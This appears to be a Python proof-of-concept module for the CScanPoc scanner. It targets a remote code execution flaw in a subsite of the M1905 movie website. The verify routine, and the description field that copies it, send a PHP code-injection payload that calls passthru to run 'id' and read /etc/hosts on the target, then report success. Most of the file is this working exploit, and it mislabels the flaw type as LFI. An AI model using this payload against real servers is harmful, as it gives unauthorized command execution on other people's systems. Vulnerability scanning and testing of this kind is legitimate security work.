# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'M1905_0101' # 平台漏洞编号
    name = 'M1905电影网 分站 远程代码执行' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2012-06-08'  # 漏洞公布时间
    desc = '''
    M1905电影网 分站 远程代码执行。
    payload = "/index.php/Content/detail/id/{${passthru($_GET[c])}}?c=id;cat /etc/hosts"
            url = self.target + payload
            response = requests.get(url)
            if 'localhost' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name)).
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=6343
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'M1905'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '4187be7b-007f-4d8a-9d7b-56c62edefbc9' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/index.php/Content/detail/id/{${passthru($_GET[c])}}?c=id;cat /etc/hosts"
            url = self.target + payload
            response = requests.get(url)
            if 'localhost' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
